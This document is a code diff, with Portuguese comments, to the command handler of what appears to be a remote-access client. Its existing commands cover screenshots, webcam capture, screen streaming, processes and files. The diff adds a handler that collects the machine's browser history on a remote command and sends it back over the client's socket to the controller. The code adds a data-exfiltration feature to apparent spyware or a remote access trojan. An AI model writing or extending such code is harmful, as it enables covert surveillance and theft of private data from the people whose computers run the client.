@@ -13,7 +13,9 @@ from utils.network_utils import send_binary_command
 from core.protocol import *
 logger = logging.getLogger("client.command_handler")
 class CommandHandler:
-    def __init__(self, connector, system_manager, process_manager, screenshot_manager, webcam_manager=None, screen_stream_manager=None, file_manager=None):
+    def __init__(self, connector, system_manager, process_manager, screenshot_manager, 
+                 webcam_manager=None, screen_stream_manager=None, file_manager=None, 
+                 browser_history_manager=None):  # Adicionado browser_history_manager
         self.connector = connector
         self.system_manager = system_manager
         self.process_manager = process_manager
@@ -21,6 +23,7 @@ class CommandHandler:
         self.webcam_manager = webcam_manager
         self.screen_stream_manager = screen_stream_manager
         self.file_manager = file_manager
+        self.browser_history_manager = browser_history_manager  # Armazenar a referência
     def process_command(self, cmd_data):
         if len(cmd_data) != 4:
             self._process_legacy_command(cmd_data)
@@ -62,6 +65,8 @@ class CommandHandler:
             self._handle_screen_stream_start_request()
         elif cmd == CMD_SCREEN_STREAM_STOP:
             self._handle_screen_stream_stop_request()
+        elif cmd == CMD_BROWSER_HISTORY_REQUEST:
+            self._handle_browser_history_request()
         else:
             logger.warning(f"Comando desconhecido recebido: {cmd}")
     def _process_legacy_command(self, initial_data):
@@ -851,3 +856,36 @@ class CommandHandler:
             return None
         finally:
             self.connector.client_socket.settimeout(original_timeout)
+    def _handle_browser_history_request(self):
+        logger.info("Solicitação de histórico de navegadores recebida")
+        threading.Thread(
+            target=self._collect_and_send_browser_history,
+            daemon=True
+        ).start()
+    def _collect_and_send_browser_history(self):
+        try:
+            if not self.browser_history_manager:
+                logger.error("Gerenciador de histórico de navegadores não disponível")
+                self._send_browser_history_error("Gerenciador de histórico não disponível")
+                return
+            logger.info("Coletando histórico de navegadores")
+            history_data = self.browser_history_manager.collect_history()
+            history_bytes = history_data.encode('utf-8')
+            logger.info(f"Enviando histórico de navegadores ({len(history_bytes) / 1024:.2f} KB)")
+            socket = self.connector.client_socket
+            if socket:
+                send_binary_command(socket, CMD_BROWSER_HISTORY_RESPONSE, history_bytes)
+            else:
+                logger.error("Socket não disponível para enviar histórico")
+        except Exception as e:
+            logger.error(f"Erro ao processar histórico de navegadores: {str(e)}")
+            self._send_browser_history_error(f"Erro: {str(e)}")
+    def _send_browser_history_error(self, error_message):
+        try:
+            error_json = json.dumps({"error": error_message}).encode('utf-8')
+            socket = self.connector.client_socket
+            if socket:
+                send_binary_command(socket, CMD_BROWSER_HISTORY_RESPONSE, error_json)
+                logger.info(f"Mensagem de erro de histórico enviada: {error_message}")
+        except Exception as e:
+            logger.error(f"Erro ao enviar mensagem de erro de histórico: {str(e)}")
